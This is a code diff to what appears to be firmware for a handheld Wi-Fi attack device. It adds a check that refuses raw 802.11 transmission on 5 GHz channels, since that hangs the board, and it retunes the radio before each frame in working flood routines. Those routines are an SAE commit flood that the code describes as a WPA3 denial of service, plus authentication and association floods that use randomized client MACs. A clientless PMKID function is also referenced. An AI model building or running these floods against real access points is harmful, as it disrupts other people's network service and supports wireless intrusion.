@@ -1285,6 +1285,21 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
   wifi_tx_raw_frame(f, n);
 }
 
+// --- Raw-TX channel guard ---------------------------------------------------------------
+// Raw 802.11 TX only completes on 2.4 GHz. wext_set_channel() will happily *store* a 5 GHz channel
+// number (the CHAN diagnostic shows set=0, got=48), but the TX path then never completes and the
+// SDK spins forever inside it - the board goes silent with no reply, no reboot and no fault print.
+// That is the failure the note above tx_beacon_raw() describes; we reproduced it by pointing a
+// flood at a 5 GHz AP. A 5 GHz target must therefore be refused, not attempted: this used to be
+// reachable from the FAP (any 5 GHz AP in List Wifi), and it wedges the whole board.
+static bool tx_raw_chan_ok(int ch, const char* who) {
+  if(ch >= 1 && ch <= 14) return true;
+  String r = String("ERROR: ") + who + " refused: raw TX is 2.4 GHz only (ch " + String(ch) +
+             " hangs the radio)";
+  Serial.println(r); Serial1.println(r);
+  return false;
+}
+
 // --- B4: SAE commit flood (WPA3 denial of service) --------------------------------------
 // WPA3 replaces the WPA2 4-way with SAE (Dragonfly). When an AP receives an Authentication frame
 // with algorithm 3 (SAE) and sequence 1 (Commit), it must run an elliptic-curve operation on the
@@ -2382,12 +2397,16 @@ void loop() {
       }else{
         if(apch < 1 || apch > 165) apch = 6;
         if(count < 1 || count > 500) count = 64;
+        if(!tx_raw_chan_ok(apch, "SAEFLOOD")) {
+          // refused above; nothing else to do
+        }else{
         if(apActive) destroyAP();
-        wext_set_channel(WLAN0_NAME, apch);
         for(int i = 0; i < count; i++) {
           flood_mac_rand();                 // a different client per commit: no state to reuse
-          sae_send_commit(bssid, flood_sta);
+          wext_set_channel(WLAN0_NAME, apch);   // tune immediately before every TX: the SDK hangs
+          sae_send_commit(bssid, flood_sta);    // inside the TX path if the radio is not tuned
           if((i & 15) == 15) delay(2);      // let the WiFi task breathe every 16 frames
+        }
         }
         String r = String("SAEFLOOD:") + String((unsigned)count) + " ch=" + String(apch);
         Serial.println(r); Serial1.println(r);
@@ -2416,17 +2435,20 @@ void loop() {
       }else{
         if(apch < 1 || apch > 165) apch = 6;
         if(count < 1 || count > 500) count = 64;
+        if(!tx_raw_chan_ok(apch, with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD")) {
+        }else{
         if(apActive) destroyAP();
-        wext_set_channel(WLAN0_NAME, apch);
         String ssid = with_assoc ? flood_ssid_for(bssid) : String("");
         for(int i = 0; i < count; i++) {
           flood_mac_rand();
+          wext_set_channel(WLAN0_NAME, apch);
           flood_tx_auth(bssid, flood_sta);
           if(with_assoc) {
             flood_tx_assoc(bssid, flood_sta, ssid.c_str());
             flood_tx_sleep(bssid, flood_sta);
           }
           if((i & 15) == 15) delay(2);   // let the WiFi task breathe every 16 frames
+        }
         }
         String r = (with_assoc ? "ASSOCFLOOD:" : "AUTHFLOOD:") + String((unsigned)count) +
                    " ch=" + String(apch) + (with_assoc ? (" ssid=" + ssid) : "");
